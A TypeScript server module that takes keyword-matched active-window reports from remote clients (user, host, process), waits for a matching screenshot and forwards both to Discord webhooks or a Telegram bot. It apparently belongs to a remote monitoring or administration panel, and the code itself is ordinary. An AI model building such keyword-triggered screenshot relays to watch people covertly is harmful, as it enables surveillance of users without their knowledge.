import { v4 as uuidv4 } from "uuid";
import {
  getNotificationScreenshot,
  saveNotificationScreenshot,
  type NotificationScreenshotRecord,
} from "../db";
import { logger } from "../logger";

export type NotificationRecord = {
  id: string;
  clientId: string;
  host?: string;
  user?: string;
  os?: string;
  title: string;
  process?: string;
  processPath?: string;
  pid?: number;
  keyword?: string;
  category: "active_window";
  ts: number;
  screenshotId?: string;
};

export type PendingNotificationScreenshot = {
  notificationId: string;
  clientId: string;
  ts: number;
  timeout: NodeJS.Timeout;
};

const NOTIFICATION_SCREENSHOT_WAIT_MS = 5_000;
const NOTIFICATION_SCREENSHOT_POLL_MS = 250;

function getScreenshotMeta(format: string | undefined): { contentType: string; ext: string } {
  const normalized = (format || "jpeg").toLowerCase();
  if (normalized === "png") return { contentType: "image/png", ext: "png" };
  if (normalized === "webp") return { contentType: "image/webp", ext: "webp" };
  if (normalized === "jpg" || normalized === "jpeg") return { contentType: "image/jpeg", ext: "jpg" };
  return { contentType: "application/octet-stream", ext: "bin" };
}

async function waitForNotificationScreenshot(
  notificationId: string,
  timeoutMs = NOTIFICATION_SCREENSHOT_WAIT_MS,
): Promise<NotificationScreenshotRecord | null> {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    const screenshot = getNotificationScreenshot(notificationId);
    if (screenshot) return screenshot;
    await new Promise<void>((resolve) => setTimeout(resolve, NOTIFICATION_SCREENSHOT_POLL_MS));
  }
  return null;
}

export function takePendingNotificationScreenshot(
  pendingNotificationScreenshots: Map<string, PendingNotificationScreenshot>,
  clientId: string,
): PendingNotificationScreenshot | null {
  for (const [commandId, pending] of pendingNotificationScreenshots.entries()) {
    if (pending.clientId !== clientId) continue;
    clearTimeout(pending.timeout);
    pendingNotificationScreenshots.delete(commandId);
    return pending;
  }
  return null;
}

export function storeNotificationScreenshot(
  notificationHistory: NotificationRecord[],
  pending: PendingNotificationScreenshot,
  bytes: Uint8Array,
  format: string,
  width?: number,
  height?: number,
): void {
  if (!bytes || bytes.length === 0) return;
  const screenshotId = uuidv4();

  saveNotificationScreenshot({
    id: screenshotId,
    notificationId: pending.notificationId,
    clientId: pending.clientId,
    ts: pending.ts,
    format,
    width,
    height,
    bytes,
  });

  const record = notificationHistory.find((item) => item.id === pending.notificationId);
  if (record) {
    record.screenshotId = screenshotId;
  }
}

async function postNotificationWebhook(
  record: NotificationRecord,
  getNotificationConfig: () => any,
  screenshot?: NotificationScreenshotRecord | null,
): Promise<void> {
  const config = getNotificationConfig();
  if (!config.webhookEnabled) return;
  const url = (config.webhookUrl || "").trim();
  if (!url) return;
  try {
    const parsed = new URL(url);
    if (!/^https?:$/.test(parsed.protocol)) {
      return;
    }
  } catch {
    return;
  }

  try {
    const isDiscord = /discord(app)?\.com$/i.test(new URL(url).hostname);
    if (isDiscord) {
      const embed: Record<string, any> = {
        title: record.keyword ? `Keyword: ${record.keyword}` : "Active Window",
        description: record.title,
        fields: [
          { name: "Client", value: record.clientId || "unknown", inline: true },
          { name: "User", value: record.user || "unknown", inline: true },
          { name: "Host", value: record.host || "unknown", inline: true },
          { name: "Process", value: record.process || "unknown", inline: true },
        ],
        timestamp: new Date(record.ts).toISOString(),
      };

      const payload: Record<string, any> = {
        content: `≡ƒöö Notification: ${record.title}`,
        embeds: [embed],
      };

      if (screenshot?.bytes?.length) {
        const meta = getScreenshotMeta(screenshot.format);
        const filename = `notification-${record.id}.${meta.ext}`;
        embed.image = { url: `attachment://${filename}` };
        const form = new FormData();
        form.append("payload_json", JSON.stringify(payload));
        form.append(
          "files[0]",
          new Blob([screenshot.bytes as any], { type: meta.contentType }),
          filename,
        );
        await fetch(url, { method: "POST", body: form });
        return;
      }

      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      return;
    }

    const payload = { type: "notification", data: record };
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
  } catch (err) {
    logger.warn("[notify] webhook delivery failed", err);
  }
}

async function postTelegramNotification(
  record: NotificationRecord,
  getNotificationConfig: () => any,
  screenshot?: NotificationScreenshotRecord | null,
): Promise<void> {
  const config = getNotificationConfig();
  if (!config.telegramEnabled) return;
  const token = (config.telegramBotToken || "").trim();
  const chatId = (config.telegramChatId || "").trim();
  if (!token || !chatId) return;

  const text = `≡ƒöö Notification\nTitle: ${record.title}\nKeyword: ${record.keyword || "-"}\nClient: ${record.clientId}\nUser: ${record.user || "unknown"}\nHost: ${record.host || "unknown"}\nProcess: ${record.process || "unknown"}`;
  try {
    if (screenshot?.bytes?.length) {
      const meta = getScreenshotMeta(screenshot.format);
      const filename = `notification-${record.id}.${meta.ext}`;
      const form = new FormData();
      form.append("chat_id", chatId);
      form.append("caption", text);
      form.append("photo", new Blob([screenshot.bytes as any], { type: meta.contentType }), filename);
      const url = `https://api.telegram.org/bot${token}/sendPhoto`;
      await fetch(url, { method: "POST", body: form });
      return;
    }

    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text }),
    });
  } catch (err) {
    logger.warn("[notify] telegram delivery failed", err);
  }
}

export async function deliverNotificationWithScreenshot(
  record: NotificationRecord,
  getNotificationConfig: () => any,
): Promise<void> {
  const screenshot = await waitForNotificationScreenshot(record.id);
  await Promise.allSettled([
    postNotificationWebhook(record, getNotificationConfig, screenshot),
    postTelegramNotification(record, getNotificationConfig, screenshot),
  ]);
}
